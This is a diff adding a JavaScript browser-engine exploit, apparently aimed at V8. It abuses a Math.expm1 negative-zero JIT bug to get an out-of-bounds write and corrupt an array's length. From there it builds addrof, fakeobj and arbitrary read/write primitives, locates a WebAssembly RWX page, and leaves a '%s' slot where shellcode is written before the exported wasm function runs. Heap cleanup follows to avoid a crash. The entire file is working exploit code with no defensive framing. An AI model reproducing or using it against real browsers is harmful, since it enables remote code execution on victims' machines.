@@ -1,0 +1,305 @@
+//conversion logic
+let conversionBuffer = new ArrayBuffer(0x8);
+let floatBuffer = new Float64Array(conversionBuffer);
+let uint64Buffer = new BigUint64Array(conversionBuffer);
+let uint32Buffer = new Uint32Array(conversionBuffer)
+
+BigInt.prototype.hex = function() {
+  return '0x' + this.toString(16);
+};
+
+BigInt.prototype.i2f = function() {
+  uint64Buffer[0] = this;
+  return floatBuffer[0];
+}
+
+BigInt.prototype.smi2f = function() {
+  uint64Buffer[0] = this 
+  uint32Buffer[1] = uint32Buffer[0];
+  uint32Buffer[0] = 0
+  return floatBuffer[0]
+}
+
+Number.prototype.f2i = function() {
+  floatBuffer[0] = this;
+  return uint64Buffer[0];
+}
+Number.prototype.i2f = function() {
+  return BigInt(this).i2f();
+}
+Number.prototype.smi2f = function() {
+  return BigInt(this).smi2f();
+}
+
+Number.prototype.hex = function() {
+  floatBuffer[0] = this
+  return uint64Buffer[0].hex()
+}
+
+class Primitives{
+
+  constructor(bigArray) {
+    this.bigArray = bigArray;
+
+    if(bigArray.length != 4096 * 30){
+      delete this.bigArray
+      return
+    }
+
+    this.floatArray1 = new Array(4)
+    this.floatArray1[0] = 1.1
+    this.floatArray1[1] = 2.2
+    this.floatArray1[2] = 3.3
+    this.floatArray1[3] = 4.4
+
+    this.objArray = new Array(4)
+    this.objArray[0] = {}
+    this.objArray[1] = 41
+    this.objArray[2] = 42
+    this.objArray[3] = 43
+
+    this.floatArray2 = new Array(4)
+    this.floatArray2[0] = 2.4
+    this.floatArray2[1] = 2.3
+    this.floatArray2[2] = 2.2
+    this.floatArray2[3] = 2.1
+
+    this.arbRwArray = new Array(6.6, 6.5, 6.4, 6.3, 6.2, 6.1);
+
+    let lastElementsArray = undefined
+    let lengthsFound = 0
+
+    for(let i = 0; i < 300; i++){
+      if(this.bigArray[i] == (4).smi2f()){
+        this.bigArray[i] = (100).smi2f()
+      }
+    }
+
+
+    // i = the index of floatArray1 elements relative to bigArray. Assert this is true by checking the next 3 elements
+    let i = bigArray.indexOf(1.1)
+
+    if(i == -1){
+      throw "Big problem don't know what happened"
+    }
+
+    if(this.bigArray[i+1] == 2.2 && this.bigArray[i+2] == 3.3 && this.bigArray[i+3] == 4.4){
+
+      this.addrOfIndex = i;
+
+      // when bigArray[addrOfIndex + 1] == (41).smi2f(), bigArray[addrOfIndex] will be the address of the empty object placed in objArray
+      // keep adding until we have found this and if we go too high throw an exception 
+      while(this.bigArray[this.addrOfIndex + 1] != (41).smi2f() || this.bigArray[this.addrOfIndex + 2] != (42).smi2f() || this.bigArray[this.addrOfIndex + 3] != (43).smi2f()){
+        this.addrOfIndex += 1;
+
+
+        if(this.addrOfIndex >= 100000){
+          throw "Could not get reliable heap layout 1"
+        }
+
+      }
+
+      // we want to find the index into floatArray1 to get to the empty object so we subtract the index into bigArray to get the empty object from the index to get the elements of floatArray1
+      this.addrOfIndex -= i
+
+      // repeat the same process for to find the index into objArray that can read a value from floatArray2
+      this.fakeObjIndex = i 
+      while(this.bigArray[this.fakeObjIndex] != 2.4 || this.bigArray[this.fakeObjIndex + 1] != 2.3 || this.bigArray[this.fakeObjIndex + 2] != 2.2 || this.bigArray[this.fakeObjIndex + 3] != 2.1){
+        this.fakeObjIndex += 1;
+        if(this.fakeObjIndex >= 1000){
+          throw "Could not get reliable heap layout 2"
+        }
+      }
+      // addrOfIndex + i gives us the index to find the elements for objArray, subtracting this from fakeObjIndex gives us the index into objArray to get a fake object
+      this.fakeObjIndex -= (this.addrOfIndex + i); 
+    }else{
+      throw "Could not get reliable heap layout 3"
+    }
+
+    this.arbRWIndex = this.bigArray.indexOf((6).smi2f());
+    console.log("[+] arbRWIndex " + this.arbRWIndex)
+
+    if(this.arbRWIndex == -1 || this.bigArray[this.arbRWIndex + 1] == 6.6){
+      throw "Could not get reliable heap layout 4"
+    }
+
+    this.bigArray[this.arbRWIndex] = (100).smi2f()
+  }
+
+  addrof(obj) {
+    this.objArray[0] = obj;
+    return this.floatArray1[this.addrOfIndex].f2i();
+  }
+
+  fakeobj(addr) {
+    this.floatArray2[0] = addr.i2f();
+    return this.objArray[this.fakeObjIndex]
+  }
+
+  read(addr, index=0) {
+
+    if(this.oldArbRWIndex == undefined) {
+      console.log("Heyyo")
+      this.oldArbRWIndex = this.bigArray[this.arbRWIndex - 1]
+    }
+
+    this.bigArray[this.arbRWIndex - 1] = (addr - 0x10n).i2f(); 
+    return this.arbRwArray[index].f2i();
+  }
+
+  write(addr, value, index=0){
+
+    if(this.oldArbRWIndex == undefined) {
+      console.log("Heyyo")
+      this.oldArbRWIndex = this.bigArray[this.arbRWIndex - 1]
+    }
+
+    this.bigArray[this.arbRWIndex - 1] = (addr - 0x10n).i2f()
+    this.arbRwArray[index] = value
+  }
+}
+
+let primitives = undefined;
+
+function getPrimitives(x=-0){
+  let escape = {minusZero:-0};
+  let oobArray = [1.1, 2.2, 1.3, 1.4];
+  let bug = Object.is(Math.expm1(x), escape.minusZero);
+
+  let bigArray = [0.1, 0.2, 0.3, 0.4];
+
+  //oobArray[bug * 7]   = (4096.0 * 30.0).smi2f();
+  oobArray[bug * 15]  = (4096.0 * 30.0).smi2f();
+
+  let ret = 0
+  ret = oobArray[8 * bug]
+
+  primitives = new Primitives(bigArray);
+
+  return [ret, bigArray.length]
+
+}
+
+function exploit() {
+
+  for(let i = 0; i < 0x1000; i++){
+    getPrimitives(0);
+  }
+
+  for(let i = 0; i < 0x2000; i++){
+    getPrimitives("0");
+  }
+
+
+  console.log('[+] starting exploit')
+
+  let ret = getPrimitives(-0);
+
+  console.log("[*] hopefully got primitives")
+  /*
+  while(ret[0] != 0.1 && ret[1] != 1024 * 1024){
+    ret = getPrimitives(-0)
+    if(count > 0x10000000){
+      break;
+    }
+    count++;
+  }*/
+
+  if(ret[0] != 0.1){
+    console.log(ret[0])
+    throw "Could not trigger oob read, check bounds is probably still in place"
+  }
+
+  if(ret[1] != 4096 * 30){
+    console.log(ret[1])
+    throw "Could not corrupt length of bigArray. Heap layout was not as expected"
+  }
+
+  let obj = {a:"primitives working"};
+
+  let addr = primitives.addrof(obj)
+  let fake = primitives.fakeobj(addr);
+
+  if(!Object.is(fake, obj)){
+    throw "Addrof or Fakeobj primitives are not working"
+  }
+
+  console.log("[+] " +fake.a)
+
+  var importObject = {
+    imports: { imported_func: arg => console.log(arg) }
+  };
+
+  //bc = [0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x8, 0x2, 0x60, 0x1, 0x7f, 0x0, 0x60, 0x0, 0x0, 0x2, 0x19, 0x1, 0x7, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0xd, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x0, 0x3, 0x2, 0x1, 0x1, 0x7, 0x11, 0x1, 0xd, 0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x1, 0xa, 0x8, 0x1, 0x6, 0x0, 0x41, 0x2a, 0x10, 0x0, 0xb];
+
+  bc = [0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x5, 0x1, 0x60, 0x0, 0x1, 0x7f, 0x3, 0x3, 0x2, 0x0, 0x0, 0x7, 0xd, 0x2, 0x3, 0x6f, 0x6e, 0x65, 0x0, 0x0, 0x3, 0x74, 0x77, 0x6f, 0x0, 0x1, 0xa, 0xb, 0x2, 0x4, 0x0, 0x41, 0x2a, 0xb, 0x4, 0x0, 0x41, 0x2b, 0xb];
+
+  wasm_code = new Uint8Array(bc);
+
+  wasm = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), importObject);
+
+  let obj1 = {x:123}
+
+  exported_function_addr = primitives.addrof(wasm.exports.one);
+  console.log("Exported function @ " + exported_function_addr.hex())
+
+  let sharedFunctionInfo = primitives.read(exported_function_addr, 3)
+
+  console.log("Shared Function Info @ " + (sharedFunctionInfo).hex())
+
+
+  let wasmExportedFunctionData = primitives.read(sharedFunctionInfo, 1);
+  console.log("Wasm Exported Function Data @ " + (wasmExportedFunctionData).hex())
+
+  let instance = primitives.read(wasmExportedFunctionData, 2);
+
+  console.log("Instance @ " + instance.hex())
+
+  let rwx = primitives.read(instance, 29)
+
+  console.log("RWX @ " + rwx.hex())
+
+
+
+  primitives.write(primitives.addrof(primitives.objArray), (4).smi2f(), 3)
+
+  console.log("send send send")
+
+  rwx = rwx + BigInt(1)
+
+  %s
+
+
+  // clean up
+
+  bigArrayAddr = primitives.addrof(primitives.bigArray)
+  arbRwArrayAddr = primitives.addrof(primitives.arbRwArray)
+
+  console.log("send send send")
+  for(let i = 0; i < 300; i++){
+    if(primitives.bigArray[i] == (100).smi2f()){
+      primitives.bigArray[i] = (4).smi2f()
+    }
+  }
+
+  console.log("send send send")
+  console.log("arbRwArrayAddr " + arbRwArrayAddr.hex())
+  console.log("primitives.arbRwArray.length: " + primitives.arbRwArray.length);
+  primitives.write(bigArrayAddr, (primitives.arbRWIndex + 4).smi2f(), 3)
+
+  primitives.bigArray[primitives.arbRWIndex - 1] = primitives.oldArbRWIndex
+  primitives.bigArray[primitives.arbRWIndex] = (6).smi2f()
+
+  console.log("primitives.floatArray1.length: " + primitives.floatArray1.length);
+  console.log("primitives.objArray.length: " + primitives.objArray.length);
+  console.log("primitives.floatArray2.length: " + primitives.floatArray2.length);
+  console.log("primitives.bigArray.length: " + primitives.bigArray.length);
+  console.log("primitives.arbRwArray.length: " + primitives.arbRwArray.length);
+
+
+  console.log("[+] send")
+  wasm.exports.two()
+  console.log("[+] sent")
+}
+
+exploit()
